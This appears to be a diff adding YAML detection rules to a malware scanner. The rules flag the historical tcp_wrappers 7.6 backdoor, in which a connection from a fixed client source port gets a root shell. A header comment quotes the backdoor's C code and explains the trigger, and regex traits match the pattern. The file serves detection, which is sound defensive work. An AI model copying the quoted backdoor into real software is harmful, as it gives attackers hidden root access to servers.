@@ -1,0 +1,57 @@
+# A daemon backdoor triggered by the *client's* source port.
+#
+# tcp_wrappers 7.6 (1999) was distributed with this added to `tcpd.c`, ahead
+# of every access-control check the package exists to perform:
+#
+#   fromlen = sizeof(from);
+#   if (getpeername(0,(struct sockaddr*)&from,&fromlen)>=0){
+#     if(ntohs(from.sin_port)==PORT){ write(0,IDENT,strlen(IDENT));
+#                                     execl(SPATH,SRUN,(char*)0); }}
+#
+# Under inetd the connection is already on stdin, so the backdoor needs no
+# socket, no bind and no dup2 -- it just execs a shell on the descriptor it
+# was handed. Connect from source port 421 and you get a root shell; everyone
+# else gets ordinary tcpd.
+#
+# The tell is that a *server* reads the peer's source port and branches on it.
+# A source port is ephemeral and chosen by the client, so it carries no
+# meaning a server could legitimately act on; testing it against a constant is
+# a knock. That holds whatever the port number, whichever shell is exec'd, and
+# whether the value sits in a macro or a literal.
+defaults:
+  platforms: [unix]
+  for: [c, cpp, text]
+  attack: T1205,T1059.004
+  mbc: B0022
+
+traits:
+  - id: peer-source-port-constant-compare
+    desc: Peer source port compared to a constant
+    crit: suspicious
+    conf: 0.93
+    if:
+      type: text
+      regex: 'ntohs\s*\(\s*[\w.>-]{1,32}sin_port\s*\)\s*==\s*[A-Za-z_0-9]{1,20}'
+
+  - id: exec-shell-from-path-variable
+    desc: Execs a shell held in a variable
+    crit: notable
+    conf: 0.9
+    # `execl(SPATH,SRUN,(char*)0)` -- the shell path and argv[0] are hoisted
+    # into globals so neither "/bin/csh" nor "-csh" appears at the call site.
+    if:
+      type: text
+      regex: '\bexecl\s*\(\s*[A-Z_][A-Z0-9_]{1,20}\s*,\s*[A-Z_][A-Z0-9_]{1,20}\s*,'
+
+composite_rules:
+  - id: source-port-triggered-shell
+    desc: Peer source port triggers a shell
+    crit: hostile
+    conf: 0.96
+    all:
+      - id: peer-source-port-constant-compare
+      - id: micro-behaviors/communications/socket/connect-state::getpeername-call
+    any:
+      - id: exec-shell-from-path-variable
+      - id: micro-behaviors/process/create/shell/native::c-shell-execution-path
+      - id: micro-behaviors/process/create/execv::c-exec-family-source
